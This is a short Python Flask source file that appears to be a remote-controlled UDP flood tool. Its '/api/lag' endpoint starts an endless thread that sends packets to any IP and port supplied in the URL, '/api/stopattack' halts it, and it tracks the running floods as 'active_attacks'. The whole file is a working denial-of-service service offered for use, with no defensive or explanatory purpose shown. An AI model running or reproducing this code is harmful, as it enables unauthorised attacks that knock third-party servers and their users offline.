from flask import Flask, request, jsonify
import threading
import socket
import random
import string

app = Flask(__name__)
active_attacks = {}

def send_udp_packets(server_ip, server_port, stop_event):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    random_text_number = ''.join(random.choices(string.ascii_letters + string.digits, k=99))
    message = random_text_number

    try:
        while not stop_event.is_set():
            udp_socket.sendto(message.encode(), (server_ip, server_port))
            print(f"Data sent to {server_ip}:{server_port}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        udp_socket.close()

@app.route('/api/lag', methods=['GET'])
def lag():
    ip = request.args.get("ip")
    port = request.args.get("port")

    if not ip or not port:
        return jsonify({"error": "Please provide ip and port"}), 400

    try:
        port = int(port)
        
        if (ip, port) in active_attacks:
            stop_event = active_attacks[(ip, port)]["stop_event"]
            stop_event.set()
            del active_attacks[(ip, port)]
            return jsonify({"message": f"Stopped attack on {ip}:{port}"}), 200

        stop_event = threading.Event()
        thread = threading.Thread(target=send_udp_packets, args=(ip, port, stop_event))
        thread.start()
        active_attacks[(ip, port)] = {
            "thread": thread,
            "stop_event": stop_event
        }
        return jsonify({"message": f"Started sending data to {ip}:{port}"}), 200

    except ValueError:
        return jsonify({"error": "Port must be a valid integer"}), 400

@app.route('/api/stopattack', methods=['GET'])
def stop_attack():
    ip = request.args.get("ip")
    port = request.args.get("port")

    if not ip or not port:
        return jsonify({"error": "Please provide ip and port"}), 400

    try:
        port = int(port)
        if (ip, port) in active_attacks:
            stop_event = active_attacks[(ip, port)]["stop_event"]
            stop_event.set()
            del active_attacks[(ip, port)]
            return jsonify({"message": f"Stopped sending data to {ip}:{port}"}), 200
        else:
            return jsonify({"error": "No active attack found for this IP and port"}), 404
    except ValueError:
        return jsonify({"error": "Port must be a valid integer"}), 400

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
